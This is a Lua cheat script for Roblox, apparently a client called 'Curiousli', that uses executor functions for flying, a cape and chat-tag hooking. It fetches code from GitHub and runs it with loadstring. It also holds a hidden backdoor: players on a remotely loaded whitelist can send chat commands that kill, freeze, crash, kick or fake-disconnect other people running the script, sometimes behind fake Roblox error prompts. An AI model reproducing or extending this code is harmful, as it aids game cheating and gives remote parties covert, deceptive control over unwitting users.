

local GuiL = shared.CGuiLibrary
print("e")
local function Button(Tab, Name, Call)
	GuiL.Button(Tab, Name, Call)
end

local function Value(Tab, Button, Name)
	GuiL.Value(Tab, Button, Name)
end

local function newwarn(Title, Text, Delay)
	GuiL.Warn(Title, Text, Delay)
end

local function updatevalue(Tab, Name, NewName)
   GuiL.UpdateValue(Tab, Name, NewName)
end

local players = game:GetService("Players")
local textservice = game:GetService("TextService")
local repstorage = game:GetService("ReplicatedStorage")
local lplr = players.LocalPlayer
local lighting = game:GetService("Lighting")
local cam = workspace.CurrentCamera
local collectionservice = game:GetService("CollectionService")
local uis = game:GetService("UserInputService")
local mouse = lplr:GetMouse()
local matchState = 0
local bedwars = {}
local bedwarsblocks = {}
local matchstatetick = 0


local betterisfile = function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil
end



local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)
	if tab.Method == "GET" then
		return {
			Body = game:HttpGet(tab.Url, true),
			Headers = {},
			StatusCode = 200
		}
	else
		return {
			Body = "bad exploit",
			Headers = {},
			StatusCode = 404
		}
	end
end 

local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport
local getasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end

local function GetURL(scripturl)
	if shared.CuriousliDeveloper then
		return readfile("curiousli/"..scripturl)
	else
		return game:HttpGet("https://raw.githubusercontent.com/ManOnTopain/CuriousliForRoblox/main/"..scripturl, true)
	end
end

local cachedassets = {}
local function getcustomassetfunc(path)
	if not betterisfile(path) then
		task.spawn(function()
			local textlabel = Instance.new("TextLabel")
			textlabel.Size = UDim2.new(1, 0, 0, 36)
			textlabel.Text = "Downloading "..path
			textlabel.BackgroundTransparency = 1
			textlabel.TextStrokeTransparency = 0
			textlabel.TextSize = 30
			textlabel.Font = Enum.Font.SourceSans
			textlabel.TextColor3 = Color3.new(1, 1, 1)
			textlabel.Position = UDim2.new(0, 0, 0, -36)
			textlabel.Parent = game.CoreGui.Curiousli
			repeat task.wait() until betterisfile(path)
			textlabel:Remove()
		end)
		local req = requestfunc({
			Url = "https://raw.githubusercontent.com/ManOnTopain/CuriousliForRoblox/main/"..path:gsub("curiousli/assets", "assets"),
			Method = "GET"
		})
		writefile(path, req.Body)
	end
	if cachedassets[path] == nil then
		cachedassets[path] = getasset(path) 
	end
	return cachedassets[path]
end

local whiteliststhing = {}

pcall(function()
    whiteliststhing = loadstring(game:HttpGet("https://raw.githubusercontent.com/ManOnTopain/Whitelist4Curi/main/main.lua"))()
end)


local whitelists = {
    ["IsPrivUserInGame"] = function()
        for i,v in pairs(game.Players:GetPlayers()) do
            for k,b in pairs(whiteliststhing) do
                if v.UserId == tonumber(b) then
                    return true
                end
            end
        end
        return false
    end,
    ["GetPrivUser"] = function()
        for i,v in pairs(game.Players:GetPlayers()) do
            for k,b in pairs(whiteliststhing) do
                if v.UserId == tonumber(b) then
                    return v.Name
                end
            end
        end
    end,
}

local alreadytold = {}



local flyEnabled = false

Button("BlatantTab", "Fly", function()
	if flyEnabled == false then
		flyEnabled = true
		repeat
		wait(0.1)
		local hum = lplr.Character:FindFirstChild("Humanoid")
		
	game.Workspace.Gravity = 0
	local flyVal = game.CoreGui.Curiousli.Background.BlatantTab.Main.FlyValue.Text
	if not flyVal.text == "" then
		hum.WalkSpeed = flyVal			
	end

		until flyEnabled == false
	else
		flyEnabled = false
		game.Workspace.Gravity = 192.6
		lplr.Character.Humanoid.WalkSpeed = 16
	end
end)

Value("BlatantTab", "Fly", "FlyValue")


local function Cape(char, texture)
		for i,v in pairs(char:GetDescendants()) do
		if v.Name == "Cape" then
			v:Remove()
		end
	end
	local hum = char:WaitForChild("Humanoid")
	local torso = nil
	if hum.RigType == Enum.HumanoidRigType.R15 then
	torso = char:WaitForChild("UpperTorso")
	else
	torso = char:WaitForChild("Torso")
	end
	local p = Instance.new("Part", torso.Parent)
	p.Name = "Cape"
	p.Anchored = false
	p.CanCollide = false
	p.TopSurface = 0
	p.BottomSurface = 0
	p.FormFactor = "Custom"
	p.Size = Vector3.new(0.2,0.2,0.2)
	p.Transparency = 1
	local decal = Instance.new("Decal", p)
	decal.Texture = texture
	decal.Face = "Back"
	local msh = Instance.new("BlockMesh", p)
	msh.Scale = Vector3.new(9,17.5,0.5)
	local motor = Instance.new("Motor", p)
	motor.Part0 = p
	motor.Part1 = torso
	motor.MaxVelocity = 0.01
	motor.C0 = CFrame.new(0,2,0) * CFrame.Angles(0,math.rad(90),0)
	motor.C1 = CFrame.new(0,1,0.45) * CFrame.Angles(0,math.rad(90),0)
	local wave = false
	repeat wait(1/44)
		decal.Transparency = torso.Transparency
		local ang = 0.1
		local oldmag = torso.Velocity.magnitude
		local mv = 0.002
		if wave then
			ang = ang + ((torso.Velocity.magnitude/10) * 0.05) + 0.05
			wave = false
		else
			wave = true
		end
		ang = ang + math.min(torso.Velocity.magnitude/11, 0.5)
		motor.MaxVelocity = math.min((torso.Velocity.magnitude/111), 0.04) --+ mv
		motor.DesiredAngle = -ang
		if motor.CurrentAngle < -0.2 and motor.DesiredAngle > -0.2 then
			motor.MaxVelocity = 0.04
		end
		repeat wait() until motor.CurrentAngle == motor.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag) >= (torso.Velocity.magnitude/10) + 1
		if torso.Velocity.magnitude < 0.1 then
			wait(0.1)
		end
	until not p or p.Parent ~= torso.Parent
end
local char = lplr.Character
local cape = false
Button("BlatantTab", "Cape", function()
	if cape == false then
		cape = true
		Cape(char, getcustomassetfunc("curiousli/assets/Cape.png"))
	else
		cape = false
				for i,v in pairs(char:GetDescendants()) do
		if v.Name == "Cape" then
			v:Remove()
		end
	end
	end
end)


				
for i,v in pairs(game.Players:GetPlayers()) do
	for _,x in pairs(whiteliststhing) do
    if lplr.UserId == tonumber(x) then
	local TTT = game.CoreGui.Curiousli.Private
	TTT.Visible = true
	TTT.Main.Image = getcustomassetfunc("curiousli/assets/PrivateLogo.png")
        v.Chatted:connect(function(msg)
            if msg == "Private Curiousli Curiousli User" then
            
                local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local yes = v.Name
local ChatTag = {}
ChatTag[yes] =
	{
        TagText = "CURIOUSLI USER",
        TagColor = Color3.new(255, 0, 0),
    }



    local oldchanneltab
    local oldchannelfunc
    local oldchanneltabs = {}

for i, v in pairs(getconnections(ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
	if
		v.Function
		and #debug.getupvalues(v.Function) > 0
		and type(debug.getupvalues(v.Function)[1]) == "table"
		and getmetatable(debug.getupvalues(v.Function)[1])
		and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
	then
		oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
		oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
		getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
			local tab = oldchannelfunc(Self, Name)
			if tab and tab.AddMessageToChannel then
				local addmessage = tab.AddMessageToChannel
				if oldchanneltabs[tab] == nil then
					oldchanneltabs[tab] = tab.AddMessageToChannel
				end
				tab.AddMessageToChannel = function(Self2, MessageData)
					if MessageData.FromSpeaker and Players[MessageData.FromSpeaker] then
						if ChatTag[Players[MessageData.FromSpeaker].Name] then
							MessageData.ExtraData = {
								NameColor = Players[MessageData.FromSpeaker].Team == nil and Color3.new(135,206,235)
									or Players[MessageData.FromSpeaker].TeamColor.Color,
								Tags = {
									table.unpack(MessageData.ExtraData.Tags),
									{
										TagColor = ChatTag[Players[MessageData.FromSpeaker].Name].TagColor,
										TagText = ChatTag[Players[MessageData.FromSpeaker].Name].TagText,
									},
								},
							}
						end
					end
					return addmessage(Self2, MessageData)
				end
			end
			return tab
		end
	end
end
            end
        end)
        else
            if whitelists["IsPrivUserInGame"]() then
               if not table.find(alreadytold, whitelists["GetPrivUser"]()) then
                  table.insert(alreadytold, whitelists["GetPrivUser"]())
              
		local eeeeee = "/whipser " .. whitelists["GetPrivUser"]()
		local aaaaaa = "All"
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(eeeeee, aaaaaa)
            task.wait(0.5)
	     
		local eeeeee = "Private Curiousli Curiousli User" .. whitelists["GetPrivUser"]()
		local aaaaaa = "All"
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(eeeeee, aaaaaa)
                  
            end
            end
    end
end
end



local function addvectortocframe(cframe, vec)
	local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = cframe:GetComponents()
	return CFrame.new(x + vec.X, y + vec.Y, z + vec.Z, R00, R01, R02, R10, R11, R12, R20, R21, R22)
end

local id = game.PlaceId
local aaaa = false

for i,v in pairs(game.Players:GetPlayers()) do
	wait(0.1)
	    
    for e,ah in pairs(whiteliststhing) do
        if v.UserId == tonumber(ah) then
        local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local yes = v.Name
local ChatTag = {}
ChatTag[yes] =
	{
        TagText = "CURIOUSLI PRIVATE USER",
        TagColor = Color3.new(255, 0, 0),
    }



    local oldchanneltab
    local oldchannelfunc
    local oldchanneltabs = {}

for i, v in pairs(getconnections(ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
	if
		v.Function
		and #debug.getupvalues(v.Function) > 0
		and type(debug.getupvalues(v.Function)[1]) == "table"
		and getmetatable(debug.getupvalues(v.Function)[1])
		and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
	then
		oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
		oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
		getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
			local tab = oldchannelfunc(Self, Name)
			if tab and tab.AddMessageToChannel then
				local addmessage = tab.AddMessageToChannel
				if oldchanneltabs[tab] == nil then
					oldchanneltabs[tab] = tab.AddMessageToChannel
				end
				tab.AddMessageToChannel = function(Self2, MessageData)
					if MessageData.FromSpeaker and Players[MessageData.FromSpeaker] then
						if ChatTag[Players[MessageData.FromSpeaker].Name] then
							MessageData.ExtraData = {
								NameColor = Players[MessageData.FromSpeaker].Team == nil and Color3.new(135,206,235)
									or Players[MessageData.FromSpeaker].TeamColor.Color,
								Tags = {
									table.unpack(MessageData.ExtraData.Tags),
									{
										TagColor = ChatTag[Players[MessageData.FromSpeaker].Name].TagColor,
										TagText = ChatTag[Players[MessageData.FromSpeaker].Name].TagText,
									},
								},
							}
						end
					end
					return addmessage(Self2, MessageData)
				end
			end
			return tab
		end
	end
end
            v.Chatted:Connect(function(msg)
                if msg == "/kill default" then
				if lplr.UserId == tonumber(ah) then
					
				else
					game.Players.LocalPlayer.Character.Humanoid.Health = -1
				end
			end
		local ppp = false
		 if msg == "/exkick default" then
				if lplr.UserId == tonumber(ah) then
					
				else
					ppp = true
					game.CoreGui.Curiousli.CRASH.Visible = true
					while wait(0.1) do
						if ppp == true then
						lplr.Character.Humanoid.WalkSpeed = 0			
						end
					end
				end
			end
			
			if msg == "/lagback default" then
				if lplr.UserId == tonumber(ah) then

				else
					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 999999999999999999999999999999999999999999999999999999999999999999999999
					wait(0.1)
					lplr.Character.Humanoid.WalkSpeed = 16
				end
			end
			
			if msg == "/jump default" then
				if lplr.UserId == tonumber(ah) then

				else
					game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
				end
			end
			
			if msg == "/sit default" then
				if lplr.UserId == tonumber(ah) then

				else
					game.Players.LocalPlayer.Character.Humanoid.Sit = true
				end
			end
					
			if msg == "/yearExplode default" then
				if lplr.UserId == tonumber(ah) then
							
				else
					local character = lplr.Character
						local explosion = Instance.new("Explosion")
			explosion.Position = character.HumanoidRootPart.Position
			explosion.Parent = character.HumanoidRootPart
							
				game.CoreGui.Curiousli.HAPPY.Visible = true
					wait(1)
					local tpService = game:GetService("TeleportService")
					local id = game.PlaceId
						local ErrorPrompt = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.ErrorPrompt)
					local prompt = ErrorPrompt.new("Default")
					prompt._hideErrorCode = true
					local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
					prompt:setParent(gui)
					prompt:setErrorTitle("Disconnected")
					prompt:updateButtons({{
						Text = "Re-TP",
						Callback = function() tpService:Teleport(id, lplr) shared.CuriousliExecuted = false end,
						Primary = true
					}}, 'Default')
					prompt:_open("HAPPY NEW YEAR! Press Re-TP to teleport back to the game!")
				end
			end
			
			if msg == "/unsit default" then
				if lplr.UserId == tonumber(ah) then

				else
					game.Players.LocalPlayer.Character.Humanoid.Sit = false
				end
			end
			

			if msg == "/freeze default" then
				if lplr.UserId == tonumber(ah) then

				else
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
				end
			end
			
			if msg == "/unfreeze default" then
				if lplr.UserId == tonumber(ah) then

				else
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
				end
			end
			
			if msg == "/void default" then
				if lplr.UserId == tonumber(ah) then

				else
					repeat
						task.wait()
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = addvectortocframe(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame, Vector3.new(0, -3, 0))
					until game.Players.LocalPlayer.Character.Humanoid.Health <= 1
				end
			end
			
			if msg == "/crash default" then
				if lplr.UserId == tonumber(ah) then

				else
					setfpscap(9e9)
				end
			end
			
			
			if msg == "/errorkick default" then
				if lplr.UserId == tonumber(ah) then

				else
					game.Players.LocalPlayer.Character.Head:Destroy()
					game.Players.LocalPlayer:Kick("error: 291\nYour head was not found")
				end
			end
			
			if msg == "/disconnect default" then
				if lplr.UserId == tonumber(ah) then

				else
							local tpService = game:GetService("TeleportService")
					aaaa = true
						local ErrorPrompt = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.ErrorPrompt)
					local prompt = ErrorPrompt.new("Default")
					prompt._hideErrorCode = true
					local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
					prompt:setParent(gui)
					prompt:setErrorTitle("Disconnected")
					prompt:updateButtons({{
						Text = "reconnect",
						Callback = function() tpService:Teleport(id, lplr) shared.CuriousliExecuted = false end,
						Primary = true
					}}, 'Default')
					prompt:_open("Please check your internet connection and try again\n(Error Code:277)")
						while aaaa == true do
						wait(0.1)
						game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0
						
						if not game.Lighting:FindFirstChild("EIEI") then
							local blur = Instance.new("BlurEffect")
							blur.Name = "EIEI"
							blur.Parent = game.Lighting
						end
					end
				end
			end
		
            end)
        end
    end
end



local HeartEnabled = false
Button("RenderTab", "Heart", function()
	if HeartEnabled == false then
		HeartEnabled = true
		game.CoreGui.Curiousli.Heart.Visible = true
		game.CoreGui.Curiousli.Heart.Image = getcustomassetfunc("curiousli/assets/Heart.png")
		repeat
		task.wait(0.1)
		game.CoreGui.Curiousli.Heart.Main.Text = lplr.Character.Humanoid.Health.."/"..lplr.Character.Humanoid.MaxHealth
		until HeartEnabled == false
	else
		HeartEnabled = false
		game.CoreGui.Curiousli.Heart.Visible = false
	end
end)





